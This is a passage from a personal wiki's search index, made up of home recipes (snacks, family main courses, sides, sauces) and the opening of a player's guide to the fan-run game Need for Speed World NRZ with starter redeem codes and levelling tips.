<li>Optional: a splash of mirin for sweetness</li> <li>Optional: a drop of vinegar for acidity</li> <li>Optional: dried seaweed, fish flakes, or a pinch of spice mix</li> </ul> <p>Instructions:</p> <ol> <li>In a shiruwan (small Japanese soup bowl), add 1 teaspoon of dashi and 1 teaspoon of miso.</li> <li>Pour in hot water and stir until dissolved.</li> <li>Adjust flavor with mirin for sweetness or a drop of vinegar for acidity, if desired.</li> <li>Add dried seaweed, fish flakes, or a little spice mix to taste.</li> </ol>"},{"location":"content/food/snacks/","title":"Snacks","text":"<p>Collection of snack recipes.</p>"},{"location":"content/food/snacks/#courgettericotta-bread","title":"Courgette/Ricotta bread","text":"<p>Ingredients</p> <ul> <li>Courgettes, sliced into 5-7mm slices</li> <li>Olive oil</li> <li>Ciabatta or rustic baguette</li> <li>Creamy ricotta cheese</li> <li>Chilly flakes</li> </ul> <p>Instructions:</p> <ol> <li>Place the courgettes in a bowl with olive oil, season with kosher salt and freshly ground pepper, add just a tiny amount of chilly flakes and toss until evenly coated.</li> <li>Add courgette slices to a griddle/grill pan, cook until golden and striped.</li> <li>Remove courgette slices from pan and toast halved bread of choice in the residual olive oil until golden and crispy. If there is not enough olive oil left, add just a touch of butter.</li> <li>Apply a coat of creamy ricotta, top with slices of courgette.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/snacks/#croque-monsieur","title":"Croque Monsieur","text":"<p>Cheese on a toast, but make it advanced.</p> <p>Bechamel Ingredients</p> <ul> <li>1 Tbsp butter</li> <li>1 Tbsp all purpose flour</li> <li>1 cup milk</li> </ul> <p>Bechamel Instructions:</p> <ol> <li>In a saucepan, melt 1 tablespoon of butter over medium heat for 2-3 minutes until it stops spattering, the stage right before browning. Make sure to swirl regularly, almost constantly.</li> <li>At this point, add 1 tablespoon of all-purpose flour and whisk into a thick paste and cook for 2-3 minutes until the raw flour dissipates.</li> <li>At which point, slowly add 1 cup of cold milk by adding in stages.</li> <li>Once the cup of milk has been added and there are no lumps in the corners, continue cooking for 5-7 minutes until nice and thick.</li> <li>Season with pepper, and a generous pinch of kosher salt.</li> <li>Whisk to combine and cook for 1 minute until it\u2019s thick enough to run down, but still coat the back of a spoon.</li> <li>Cover and allow to cool for 10-15 minutes before sandwich assembly.</li> </ol> <p>Croque Monsieur Ingredients</p> <ul> <li>Bechamel</li> <li>Brioche bread</li> <li>Gruyere or Raclette cheese (or both), shredded</li> <li>Slices of ham</li> <li>Dijon mustard</li> </ul> <p>Croque Monsieur Instructions:</p> <ol> <li>Start by toasting two pieces of brioche bread then shred some of the cheese. Spread a couple of tablespoons worth of the bechamel on the bottom slice of the bread, just enough to cover it.</li> <li>Top that with a generous amount of cheese along with slices of ham, topping with another generous amount of gruyere, spreading the top slice of bread with dijon mustard before placing on top.</li> <li>Spread another layer of bechamel on top of the sandwich and another layer of cheese.</li> <li>Place into a broiler or oven until thoroughly brown and bubbly.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/snacks/#porto-melon","title":"Porto melon","text":"<p>Ingredients</p> <ul> <li>Porto wine</li> <li>Melon</li> </ul> <ol> <li>Cut the melon in half and remove the core from both sides.</li> <li>Fill the core with porto wine.</li> <li>Dig in with a spoon and enjoy!</li> </ol>"},{"location":"content/food/snacks/#feta-avacado-toast","title":"Feta-avacado toast","text":"<p>Ingredients</p> <ul> <li>Feta cheese</li> <li>Avacado</li> <li>Tomato</li> <li>Baguette/ciabatta or equivalent bread</li> </ul> <ol> <li>Toast the bread.</li> <li>Load equal parts feta and mashed avacado.</li> <li>Slice tomatoes on top (try different thicknesses to find your balance).</li> <li>Add salt and freshly ground pepper.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/snacks/#noo-soolapeekon-saltbacon","title":"N\u00f5o soolapeekon / saltbacon","text":"<p>Stolen from Veiko :D</p> <p>Ingredients</p> <ul> <li>N\u00f5o saltbacon (the more stripes the better)</li> </ul> <ol> <li>Slice into comfortable slices</li> <li>Slap on a pan or grill (better).</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/snacks/#pesto-rolls-pestorullid","title":"Pesto rolls / Pestorullid","text":"<p>Ingredients</p> <ul> <li>p\u00e2te feuillet\u00e9e / lehttainas / dough</li> <li>cream cheese</li> <li>pesto</li> <li>grated cheese</li> </ul> <ol> <li>Roll dough.</li> <li>Add cream cheese, pesto and grated cheese.</li> <li>Roll dough with stuffing inside and cut into roughly 1cm slices.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/snacks/#cruncy-simian","title":"Cruncy Simian","text":"<p>From Afghanistan and India originally. Thank you Ahmed and Meeran!</p> <p>Ingredients</p> <ul> <li>1 cup of chickpea flour</li> <li>1 tsp ground Ajwana seed</li> <li>1/2 tsp salt</li> <li>1 tbsp vegetable oil</li> <li>yellow/red/green food coloring or spices</li> </ul> <ol> <li>Mix with water, make dough that's pretty much the same texture as making bread</li> <li>Use a press to turn balls of dough into strips, drop them directly into heated oil</li> <li>Fry for a minute or so, remove to a bowl and then press more in, repeat</li> <li>E4ta!</li> </ol>"},{"location":"content/food/snacks/#garlic-cottage-cheese-sickosnack","title":"Garlic cottage cheese sickosnack","text":"<p>Best when sick :P</p> <p>Ingredients</p> <ul> <li>Cottage cheese (with shrimp chunks)</li> <li>Garlic</li> <li>Thin snack bread (sourdough rye thins)</li> </ul> <ol> <li>Scoop cottage cheese on the bread.</li> <li>Slice garlic into thin stick, stab them into the cheese.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/papas/papa-dessert/","title":"Papa's Desserts","text":""},{"location":"content/food/papas/papa-dessert/#emme-pontsikud","title":"Emme pontsikud","text":"<p>Ingredients</p> <ul> <li>Curd - 2 packs</li> <li>Flour by feel so that it's a bit harder, not runny</li> <li>Egg 4 pcs</li> <li>Cooking soda</li> </ul>"},{"location":"content/food/papas/papa-dessert/#emme-vahvlid","title":"Emme vahvlid","text":"<p>Ingredients</p> <ul> <li>200g of butter</li> <li>2 dl wheat flour</li> <li>2 dl of starch</li> <li>3 eggs</li> <li>A teaspoon of vanilla sugar</li> <li>2 dl sugar</li> <li>1.5dl of water</li> </ul>"},{"location":"content/food/papas/papa-main/","title":"Papa's Main Courses","text":""},{"location":"content/food/papas/papa-main/#hoisin-chicken","title":"Hoisin chicken","text":"<p>Ingredients</p> <ul> <li>2 packs of chicken thigh meat</li> <li>Salt, pepper, Tibetan chili powder marinade</li> <li>Mushrooms 1 pack</li> <li>2 large onions</li> <li>Garlic 6 cloves</li> <li>Chilli 2 pcs</li> <li>Hoisin sauce</li> <li>Soy, water, starch</li> </ul>"},{"location":"content/food/papas/papa-main/#butter-chicken","title":"Butter chicken","text":"<p>Pork Ingredients</p> <ul> <li>Pork neck chop</li> <li>Fish sauce</li> <li>Soy sauce</li> <li>Honey</li> </ul> <p>Spice Mix Ingredients</p> <ul> <li>Onion</li> <li>Garlic</li> <li>Chili</li> <li>Chicken broth</li> <li>Lime</li> <li>Paprika</li> </ul> <p>Fry separately and combine.</p>"},{"location":"content/food/papas/papa-main/#bresse-chicken","title":"Bresse chicken","text":"<p>Ingredients</p> <ul> <li>Whole chicken</li> <li>Garlic</li> <li>Bouquet garni (leek, sprig of thyme)</li> <li>Onion</li> <li>Mushrooms</li> <li>Flour</li> <li>White wine</li> <li>Cream</li> <li>Vinegar</li> </ul> <ol> <li>Season the chicken breast with salt and white pepper and put it in the oven at 180 degrees for 30 minutes.</li> <li>Fry the buns and wings in butter, salt and white pepper, garlic, bouquet garni (leek, sprig of thyme), onion, mushrooms, then add flour and white wine, cream and a little vinegar.</li> </ol>"},{"location":"content/food/papas/papa-main/#korean-crispy-chicken","title":"Korean Crispy Chicken","text":"<p>Chiken Ingredients</p> <ul> <li>Chicken thigh meat</li> <li>Frying mixture (flour, starch, baking powder, salt, vodka, water)</li> </ul> <p>Fry for 8 minutes in 160-degree oil and a second time at 190 degrees.</p> <p>Dip Ingredients</p> <ul> <li>Korean chili sauce 1 tbsp</li> <li>Rice vinegar 1 tsp</li> <li>Honey 1 tbsp</li> <li>Sesame oil</li> <li>Sesame seeds</li> </ul>"},{"location":"content/food/papas/papa-main/#coucou-au-cidre","title":"Coucou au cidre","text":"<p>Ingredients</p> <ul> <li>Chicken</li> <li>Shallots</li> <li>Calvados</li> <li>Cider</li> <li>Creme fraiche</li> <li>Chicken Stock</li> </ul> <ol> <li>Brown the chicken pieces in plenty of butter.</li> <li>Add the shallots, calvados (flamb\u00e9), cider, creme fraiche, chicken stock</li> <li>Simmer for 30 minutes.</li> </ol>"},{"location":"content/food/papas/papa-main/#coq-au-vin","title":"Coq au vin","text":"<p>Ingredients</p> <ul> <li>Chicken</li> <li>Garlic</li> <li>Bouquet garni</li> <li>Pancetta</li> <li>White wine (originally with red wine)</li> <li>Cream</li> <li>Butter</li> </ul> <ol> <li>Season the chicken with salt and pepper (also white pepper).</li> <li>Add bouquet garnish, white wine (whole bottle) and marinate overnight</li> <li>Add pancetta first to fry with mushrooms and butter.</li> <li>Remove the mix from pan and put the chicken on. Fry for 15 minutes on each side.</li> <li>Add 3 minced garlic cloves.</li> <li>Add the pancetta mixture back</li> <li>Add the wine marinade mix and let it simmer for 45 minutes.</li> <li>Remove the yolk from one egg, add about 100ml of cream to the egg yolk and beat until combined, then pour into the pan.</li> <li>Add chicken and chopped parsley.</li> </ol>"},{"location":"content/food/papas/papa-main/#shaksuka","title":"Shaksuka","text":"<p>Ingredients</p> <ul> <li>Onions</li> <li>Peppers</li> <li>Garlic</li> <li>Tomato</li> <li>Cumin and cayenne spice</li> <li>Tomato puree</li> <li>Sausages</li> <li>Parsley</li> <li>Coriander</li> <li>Eggs</li> <li>Feta cheese</li> </ul> <ol> <li>Fry onions and peppers.</li> <li>Add garlic and tomato.</li> <li>Season with cumin and cayenne pepper and add tomato puree.</li> <li>Add grilled sausages, season with salt and pepper.</li> <li>Add parsley and coriander.</li> <li>Add eggs on top and cook covered.</li> <li>Remove from pan adn add feta cheese before serving.</li> </ol>"},{"location":"content/food/papas/papa-main/#shaurma-israeli-charcoal-grilled-meat","title":"Shaurma (Israeli charcoal-grilled meat)","text":"<p>Marinade Ingredients</p> <ul> <li>Lemon juice</li> <li>Oil</li> <li>Cumin seeds</li> <li>Coriander powder</li> <li>Cayenne pepper</li> <li>Paprika</li> <li>Bay leaves</li> </ul> <p>Combine and marinate the meat to be grilled in it.</p>"},{"location":"content/food/papas/papa-main/#lemon-chicken","title":"Lemon chicken","text":"<p>Ingredients</p> <ul> <li>Chicken</li> <li>White wine</li> <li>Lemon</li> <li>Garlic</li> <li>Thyme</li> <li>Rosemary</li> <li>Olive oil</li> </ul> <ol> <li>Cover the fillet strips with white wine and mix everything else in.</li> <li>Marinate for 2 hours.</li> <li>Preheat the oven to 150 degrees.</li> <li>Put in a biscuit tin, cover with foil, place in a frying pan with approximately 2 cm of water.</li> <li>Place in the oven at 150 degrees for 90 minutes.</li> <li>Remove from the oven and set aside to cool. Put some weight on.</li> </ol>"},{"location":"content/food/papas/papa-main/#chicken-pasta-with-sun-dried-tomato-pesto","title":"Chicken pasta with sun-dried tomato pesto","text":"<p>Chicken Ingredients</p> <ul> <li>1 large onion</li> <li>2 cloves of garlic</li> <li>0.5 kg Chicken thigh meat</li> <li>150g of tomato paste</li> <li>Pasta</li> </ul> <p>Pesto Ingredients</p> <ul> <li>Handful of almonds</li> <li>Small bell pepper</li> <li>150g sun-dried tomato in oil</li> <li>Bunch of basil</li> <li>A thumb-sized piece of grated Parmesan</li> </ul> <ol> <li>Boil pasta, keep them a bit firm.</li> <li>Fry the chicken ingredients in a pan and mix with the pasta.</li> <li>Combine the pesto ingredients in a blender.</li> <li>Serve pasta separately with pesto, to be added on top.</li> </ol>"},{"location":"content/food/papas/papa-main/#japanese-macaroni-gratin","title":"Japanese Macaroni Gratin","text":"<p>Loosely inspired by Just One Cookbook's Macaroni Gratin.</p> <p>Ingredients</p> <ul> <li>Chicken thigh meat</li> <li>Shrimp</li> <li>Leek</li> <li>Garlic</li> <li>Chili paste</li> <li>Macaroni</li> <li>Oat cream</li> <li>Salt</li> <li>White pepper</li> <li>Soy sauce</li> <li>Mirin</li> <li>Sake</li> <li>Cheddar cheese</li> <li>Parmesan</li> <li>Panko</li> </ul> <ol> <li>Bake in 230 degree oven</li> </ol>"},{"location":"content/food/papas/papa-main/#not-japanese-macaroni-gratin","title":"Not-Japanese Macaroni Gratin","text":"<p>Loosely inspired by Just One Cookbook's Macaroni Gratin.</p> <p>Ingredients</p> <ul> <li>Chicken thigh meat</li> <li>Leek</li> <li>Garlic</li> <li>Chili paste</li> <li>Gnocchi</li> <li>Oat cream</li> <li>Salt</li> <li>White pepper</li> <li>Soy sauce</li> <li>Cheddar cheese</li> <li>Parmesan</li> <li>Panko</li> <li>Nuts</li> </ul> <ol> <li>Bake in 230 degree oven</li> </ol>"},{"location":"content/food/papas/papa-main/#ginger-garlic-ribs","title":"Ginger-Garlic Ribs","text":"<p>Marinade Ingredients</p> <ul> <li>A thumb of grated ginger</li> <li>3 normal cloves of garlic</li> <li>3 pickled cloves of garlic</li> <li>Soy sauce</li> <li>Sweet soy sauce</li> <li>Vinegar (Chinese)</li> <li>Paprika powder</li> <li>Cayenne pepper</li> <li>Pepper</li> </ul> <ol> <li>Brush the ribs with marinade.</li> <li>Let it marinate overnight.</li> <li>Take out at least half of the marinade and put it aside.</li> <li>Cover in foil and leave in the oven at 180C for an hour.</li> <li>Take the foil off, add the saved marinade back on top, then leave in the oven with the grilling function at 220C.</li> <li>Take out when brown and slightly, just barely charred at the edges of the bones.</li> </ol>"},{"location":"content/food/papas/papa-main/#pomegranate-soya-chicken","title":"Pomegranate soya chicken","text":"<p>Chicken Ingredients</p> <ul> <li>1.5kg chicken</li> <li>2 onions</li> <li>4 gloves of garlic</li> <li>2cm piece of ginger</li> <li>2 stalks of celery</li> <li>pepper</li> </ul> <p>Sauce Ingredients</p> <ul> <li>Soya</li> <li>Sweet soya</li> <li>Rice vinegar</li> <li>Pomegranate syrup</li> <li>Harissa paste</li> <li>Starch</li> <li>Water</li> </ul>"},{"location":"content/food/papas/papa-main/#okonomiyaki","title":"Okonomiyaki","text":"<p>From Joshua Weissman.</p> <p>Okonomiyaki Batter Ingredients</p> <ul> <li>1 cup (152g) all purpose flour</li> <li>1/2 teaspoon (3g) kosher salt</li> <li>1/4 teaspoon (1g) baking powder</li> <li>4 eggs  </li> <li>1/2 cup (120ml) dashi</li> <li>1/2 large head cabbage  </li> <li>2 tablespoons (30g) red pickled ginger chopped (beni shoga)</li> <li>1/4 pound shrimp, poached and cut into small bite sized pieces</li> <li>optional 1/2 cup (30g) agedama/tenkasu (tempura scrap)</li> <li>1 bunch thin sliced green onion</li> <li>pork belly, bacon</li> </ul> <p>Batter instructions:</p> <ol> <li>Mix flour, baking powder, salt, whole eggs and dashi. Lumps are ok.</li> <li>Season your green cabbage with salt, and squeeze the water out of it.</li> <li>Poach your shrimp in a bit of dashi. Cool off and cut into small pieces</li> <li>Toss cabbage, shrimp, pickled ginger, agedama and onion whites in batter.</li> <li>To cook the pancake, start a nonstick pan with a cooking spray in medium heat.</li> <li>Add thin strips of pork belly / bacon.</li> <li>Flip pancake and brush with sauce.</li> <li>Flip pancake again and brush the other side with sauce.</li> <li>Once pancake is done, finish with one last drizzle of sauce, finish with bonito flakes, kewpie mayonnaise, sliced green onions and nori.</li> </ol> <p>Okonomiyaki Sauce Ingredients</p> <ul> <li>2 tablespoons (53g) lacto ketchup or regular ketchup</li> <li>2 tablespoons (28ml) Worcestershire sauce</li> <li>1 tablespoon (14ml) soy sauce</li> <li>1 tablespooonn 14g honey</li> <li>2 teaspoons (8g) molasses</li> </ul> <p>Sauce instructions:</p> <ol> <li>Mix all ingredients in a bowl. Store and use as needed.</li> </ol> <p>Topping Ingredients</p> <ul> <li>Bonito Flakes</li> <li>Thin sliced green onion</li> <li>Thin chiffonade nori</li> </ul>"},{"location":"content/food/papas/papa-main/#fennel-jam-pork","title":"Fennel Jam Pork","text":"<p>Almond Cream Ingredients</p> <ul> <li>Milk - 1 l</li> <li>Almonds - 200 g</li> <li>Butter - 1 tbsp</li> </ul> <p>Almond Cream Instructions:</p> <ol> <li>Boil for an hour, blend, and cook until it reaches the desired cream consistency.</li> </ol> <p>Fennel Jam Ingredients</p> <ul> <li>Fennel - 1 pc</li> <li>Large onion - 1 pc</li> <li>Fennel seeds - 1 tsp</li> <li>Garlic - 2 cloves</li> <li>Chili - 1 pod</li> <li>Orange - 1 pc</li> <li>White wine - 150 ml</li> <li>A little butter</li> <li>Sugar, lemon juice</li> </ul> <p>Fennel Jam Instructions:</p> <ol> <li>Chop onion, fennel, chili, and garlic</li> <li>Fry in a pan until soft, add wine, simmer until the wine has reduced</li> <li>Add orange juice and simmer until reduced</li> <li>Season with sugar and lemon juice.</li> </ol> <p>Pork Neck Chop Instructions:</p> <ol> <li>Cut into 3cm steaks, season with salt and pepper, fry covered on both sides for 5 minutes or until desired doneness is achieved. Let rest on the cutting board for about 5 minutes, slice into strips, and serve with almond cream and fennel jam.</li> </ol>"},{"location":"content/food/papas/papa-main/#lentil-vegetable-casserole-with-some-zest","title":"Lentil-vegetable casserole with some zest","text":"<p>Ingredients</p> <ul> <li>500g cleaned pumpkin</li> <li>1 paprika</li> <li>4 kale leafs</li> <li>2 dl lentils</li> <li>1 onion</li> <li>3 gloves garlic</li> <li>400g crushed tomatoes</li> <li>5 dl vegetable bullion</li> <li>1 small cinnamon peel</li> <li>1 tbsp ground cumin</li> <li>2 tsp ground chipotle</li> <li>1 tsp dried oregano</li> <li>2 tbsp olive oil</li> <li>some parsley or coriander leafs0</li> </ul> <p>Sauce Ingredients</p> <ul> <li>2 dl fat yogurt</li> <li>1 glove garlic</li> <li>2 tsp ground chipotle</li> <li>a little lime or lemon juice if desired</li> </ul> <ol> <li>Chop the pumpkin, place on a baking tray with baking paper, season with salt, chipotle, cumin and oil.</li> <li>Mix and then bake at 200C for 20-25 minutes.</li> <li>Chop the onion, garlic, pepper.</li> <li>Tear kale from the thick roots and dice</li> <li>Cook the paprika and onion in a deeper pan about 7 minutes until soft</li> <li>Add garlic and seasoning, mix</li> <li>Add lentils, tomato and bullion</li> <li>Cover and let simmer for 20 minutes until lentils soften. Stir and add water if needed.</li> <li>Add kale and let soften for 3 minutes</li> <li>Mix in the pumpkin and season to taste</li> <li>Mix in the sauce</li> <li>Serve with some parsley or coriander</li> <li>Et voila!</li> </ol>"},{"location":"content/food/papas/papa-side/","title":"Papa's Sides, Sauces & Spice Mixes","text":""},{"location":"content/food/papas/papa-side/#caponata","title":"Caponata","text":"<p>Inspired by and adjusted from Eggplant Caponata With Raisins (also in video recipe form).</p> <p>Ingredients</p> <ul> <li>2 pounds eggplant - cubed</li> <li>1 cup celery - chopped</li> <li>1 cup red onion - chopped</li> <li>1 cup pitted green olives - chopped</li> <li>1/4 cup indian nuts</li> <li>1/4 cup parsley - minced</li> <li>1/8 cup capers - rinsed</li> <li>1 (6) ounce can tomato paste or just tomatoes</li> <li>3/4 cup olive oil</li> <li>1/4 cup red wine vinegar</li> <li>1 Tbsp sugar or a little less</li> <li>1 tsp kosher salt</li> <li>1/2 tsp black pepper</li> </ul> <p>Notes:</p> <ul> <li>The flavors will meld together and change the taste profile for the next day.  Of course, it can be eaten right away too!</li> <li>Before roasting you can salt the eggplant pieces for 30 minutes. The salt will release moisture from the eggplants and allow them to cook quicker in the oven.  Using a paper towel, pat dry the eggplants with a wiping action to remove some of the salt before roasting.</li> <li>The texture of the caponata is really a personal preference. If you like it on the softer side, saute the veggies a little bit longer and/or cut them smaller.  Conversely, just cook them for a few minutes if you want the celery and onion crunch.</li> </ul> <p>Possible additions:</p> <ul> <li>Add some zucchini to this caponata for a nice twist.</li> <li>Use 1-2 large bell peppers, cut up into bite-size chunks for added texture and flavor.</li> <li>Roast 1 cup of carrots with the eggplant for added flavor or just sear them in the pan with the onions and celery to introduce a crunchy texture.</li> <li>Saute 3-4 chopped anchovies until they melt with the celery and onion.</li> <li>Mint and basil are excellent additions!</li> </ul> <p>Instructions:</p> <ol> <li>Preheat oven to 425F and begin by cutting 2 pounds of eggplant into approximately 1\u2033 cubes.</li> <li>Place all the cut eggplant into a large glass bowl and toss with a 1/2 cup of olive oil, a tsp of kosher salt and a 1/2 tsp of black pepper.  Use enough oil to coat all the pieces.</li> <li>On a large baking sheet (line it with parchment paper to avoid sticking) spread out the eggplant. Keep the pieces from touching and if necessary use 2 sheet pans.  Place the eggplant on the middle oven rack and roast for 25-30 minutes.</li> <li>While the eggplant is roasting begin cutting 1 cup of celery into smallish pieces like shown.</li> <li>Cut 1 cup of onion into half-moon strips.  You can cut the onion and celery any way you want!  Some people like a chunkier caponata while others prefer a smoother one.</li> <li>Toast a 1/4 cup of pignoli (pine) nuts in a separate pan over medium-low heat for 5 minutes or so.  Be careful, they burn easily.  When finished toasting, remove the nuts and set them aside.</li> <li>In a large pan saute the onion and celery for a few minutes in a 1/4 cup of olive oil over medium heat.  Again this is a preference/textural thing.  If you like crunchy vegetables in your caponata only saute them for a minute or so.</li> <li>Add in one 6-ounce can of tomato paste and cook for 3 minutes longer, spreading the paste all around the pan.</li> <li>After 25-30 minutes the eggplant will be nicely roasted as shown.  Use a fork and make sure they are soft on the inside and fully cooked.  If not, another 5 minutes in the oven is fine.</li> <li>To the pan add 1 cup of pitted good quality green olives, an 1/8 cup of rinsed capers  Also, add 1 Tbsp of sugar and a 1/4 cup of red wine vinegar.  Cook for 5 minutes stirring occasionally to avoid sticking.</li> <li>Add in the eggplant and pine nuts and cook for 3 more minutes to ensure the caponata is well mixed.  Be careful while mixing in the eggplant to avoid mashing it too much.  A gentle stir with a wooden spoon is all that\u2019s required.</li> <li>Finally, add a 1/4 cup of chopped fresh parsley, give it one more stir, and a taste test.  Adjust salt, pepper, and sugar if necessary.  If satisfied, let it cool, then place it in a container and refrigerate.</li> </ol>"},{"location":"content/food/papas/papa-side/#cauliflower-with-cheese","title":"Cauliflower with cheese","text":"<p>Ingredients</p> <ul> <li>Cauliflower</li> <li>Gruyere and Emmental cheese</li> <li>Phenol seeds, crushed</li> <li>Paprika</li> <li>Cumin seeds</li> <li>Olive oil</li> <li>Salt</li> <li>Pepper</li> <li>Chile</li> <li>Honey</li> <li>Lemon juice</li> </ul> <ol> <li>Boil the cauliflower for 5 minutes and preheat the oven to 180 degrees.</li> <li>Mix the spices, olive oil, honey and lemon juice in a bowl.</li> <li>Cover the cauliflower with the mixture and bake at 180 degrees for 15-20 minutes.</li> <li>Grate Gruyere and Emmental cheese and add to the cauliflower with lemon peels. 5 minutes in the oven</li> </ol>"},{"location":"content/food/papas/papa-side/#couscous","title":"Couscous","text":"<p>Ingredients</p> <ul> <li>Boiled Couscous</li> <li>Chopped onion</li> <li>Lemon peels and juice</li> <li>Parsley</li> <li>Mint, coriander</li> <li>Sumach or chili powder</li> </ul>"},{"location":"content/food/papas/papa-side/#piri-piri-sauce","title":"Piri piri sauce","text":"<p>Ingredients</p> <ul> <li>Chopped onion</li> <li>Garlic 4 pcs</li> <li>Chilli 4 pcs</li> <li>2 Lemon juice and grated zest</li> <li>Vinegar 1 tbsp</li> <li>Worcester sauce variety</li> <li>Paprika 1 tsp</li> <li>Horseradish 1 tsp</li> <li>Sugar 1 tsp</li> <li>Chopped parsley</li> </ul>"},{"location":"content/food/papas/papa-side/#french-dip","title":"French dip","text":"<p>Ingredients</p> <ul> <li>Butter</li> <li>Shallots</li> <li>Champignons</li> <li>Garlic</li> <li>Thyme</li> <li>Flour</li> <li>Red wine</li> <li>Beef broth</li> <li>Demi-glace</li> <li>Reduce by a third</li> <li>Tarragon</li> </ul> <ol> <li>Put the butter and onion in the pan with the mushrooms.</li> <li>Add garlic, thyme, flour, red wine and heat until half of the wine is gone.</li> <li>Add beef broth, demi-glace and reduce by a third.</li> <li>Chop in the tarragon.</li> </ol>"},{"location":"content/food/papas/papa-side/#jerk-seasoning-mix","title":"Jerk seasoning mix","text":"<p>Ingredients</p> <ul> <li>Hot chilies</li> <li>Fresh onion</li> <li>Ginger</li> <li>Wine vinegar 2 spoons</li> <li>Oil</li> <li>5 cloves of garlic</li> <li>Allspice 20 pcs</li> <li>Lots of pepper</li> <li>Thyme</li> <li>Nutmeg</li> <li>Cinnamon 1 tsp</li> <li>Smoked paprika 1 tsp</li> <li>Muscovado sugar 2 spoons</li> </ul>"},{"location":"content/food/papas/papa-snacks/","title":"Papa's Snacks","text":""},{"location":"content/food/papas/papa-snacks/#mighty-breakfast-apple-sandwich","title":"Mighty breakfast apple sandwich","text":"<p>It has been said to cure depression and invigorate even the most tired of souls who have been up on feet for days without eating.</p> <p>Ingredients</p> <ul> <li>Baguette or equivalent</li> <li>Neutral cheddar cheese</li> <li>Bacon</li> <li>Cayenne pepper</li> <li>Egg</li> <li>Soy sauce</li> <li>Onion flakes</li> <li>Japanese mayonnaise</li> <li>Apple</li> </ul> <p>Notes:</p> <ul> <li>The bacon is optional and it is very is for it to overpower the taste balance so use it very sparingly.</li> <li>Depending on the onion flakes, these can be quite strong in taste as well. When used with the bacon, be careful as these two can bring too much salt into the taste profile.</li> <li>Probably just don't add salt.</li> </ul> <p>Instructions:</p> <ol> <li>Slap some butter on the pan, toast the bread from one side until golden brown.</li> <li>Turn the bread over and add slices of cheese as the other side goldens. </li> <li>Remove bread from pan, turn the heat up slightly and add bacon seasoned with cayenne pepper.</li> <li>When there are slight signs of char on the bacon remove on to paper towels to drain excess fat and keep them crispy.</li> <li>Turn the heat down to medium, add the egg with a splash of soy sauce, cook and flip until the egg is cooked to your liking.</li> <li>Add the egg on top of the cheese that is on the bread, then break the bacon into pieces and add on top of the egg.</li> <li>Draw squiggles of Japanese mayonnaise on the bread, add a sprinkle of onion flakes and top with about 3mm apple slices.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/papas/papa-snacks/#hot-smoked-fish-salad","title":"Hot-Smoked Fish \"Salad\"","text":"<p>Every time you're hosting for a group there's bound to be someone like me says things like \"I don't really like seafood...\" Well, this recipe is perfect for converting people to the Dark Side of seafood because it doesn't really taste very fishy. Fortunately it's dead simple to make so it will be no problem if the seafood-haters guests come looking for seconds.</p> <p>Best served on ciabatta or equivalent bread.</p> <p>Ingredients</p> <ul> <li>1 small hot-smoked fish (eg smoked sea bass)</li> <li>4 eggs</li> <li>1-2 (red) onions</li> <li>Fresh dill and chives</li> <li>Hellmann's (or other neutral) mayonnaise</li> </ul> <p>Instructions:</p> <ol> <li>Boil the eggs for 10 minutes, then cool under running cold water, peel and break the eggs with a fork.</li> <li>Peel and finely chop the onion. Clean the smoked fish and cut it into smaller pieces.</li> <li>Mix onion, chopped eggs, smoked fish and herbs in a bowl. Add enough mayonnaise to bind the ingredients together.</li> <li>If desired, season with salt and pepper.</li> <li>Slap the \"salad\" on some ciabatta or equivalent alternative and watch even the seafood haters devour it.</li> <li>Et voil\u00e0!</li> </ol>"},{"location":"content/food/papas/papa-snacks/#pickles","title":"Pickles","text":"<p>Ingredients (for a 3L jar)</p> <ul> <li>1.5 tbsp of sugar</li> <li>2 tablespoons of salt</li> <li>3 tablespoons of vinegar</li> </ul>"},{"location":"content/food/papas/papa-snacks/#truffle-bacon-sandwich","title":"Truffle-bacon sandwich","text":"<p>Ingredients</p> <ul> <li>Bread</li> <li>Cream cheese</li> <li>Truffle sauce</li> <li>Bacon / serrano ham</li> <li>Egg</li> </ul> <ol> <li>Toast the bread.</li> <li>Coat in cream cheese and spread some truffle sauce.</li> <li>Add crispy bacon or serrano ham.</li> <li>Add thin slices of egg on top.</li> <li>Add salt and freshly ground pepper.</li> </ol>"},{"location":"content/games/nfs-world-nrz/","title":"Need for Speed World NRZ Guide","text":"<p>Need for Speed World NRZ (NightRiderz) is a fan-made revival of the classic Need for Speed World, offering players an enhanced experience with new features, events, and customization options. This guide is designed to help both new and experienced players navigate the game, maximize their rewards, and master advanced techniques also gives me a place to put notes and interesting information.</p>"},{"location":"content/games/nfs-world-nrz/#starter-redeem-codes","title":"Starter redeem codes","text":"<p>Redeem in nightriderz.world from <code>Profile Icon &gt; 'Redeem Code'</code></p> <ul> <li><code>YTBR-MRJC-KYT1-3DG9</code>: Toyota Supra + $500k</li> <li><code>YTBE-LPR1-PP3R-24GG</code>: Viper SRT 10 - Elite Edition</li> <li><code>MZA5-J6ZE-LPRI-PPER</code>: 4500 SpeedBoost (Must be under level 10)</li> </ul>"},{"location":"content/games/nfs-world-nrz/#leveling-up","title":"Leveling Up","text":"<p>Leveling up in NRZ has a some general rules as to how payouts are made in events:</p> <ul> <li>The lower the class the higher the reward bonus.</li> <li>Circuit events tend to offer higher payouts compared to other event types.  </li> <li>Longer races have better rewards. This is why the low class reward bonus exists: to balance this rule. </li> <li>Finishing in higher placements, such as 1st place, increases payouts.  </li> <li>Multiplayer races provide more rewards than singleplayer. However, for grinding purposes, the waiting time for multiplayer races may reduce overall efficiency even with higher payouts.</li> <li>Achieving a perfect start provides slightly better rewards.</li> <li>Ramming/destroying more cops in Team Escapes or Pursuits will net higher rewards.</li> </ul>"},{"location":"content/games/nfs-world-nrz/#most-efficient-event-for-under-level-60","title":"Most efficient event for under level 60","text":"<p>Lemans is a highly efficient event for leveling up, especially for players below Level 40. However, its efficiency decreases significantly after Level 60.</p> <p>Example Lemans payouts at level 95 with S2 Class car:</p> <ul> <li>Average REP: ~34,482 per minute</li> <li>Average Cash: ~56,724 per minute</li> </ul> <p>To illustrate Lemans efficiency here are the stats after Prestige 1 when my level was reset to Level 1:</p> <ul> <li>Levelskipped from Level 1 to Level 28: Using the FXX-K for 28 minutes during a 2x weekend (without the +50% boost), 23,212 REP and 149,411 cash.  </li> 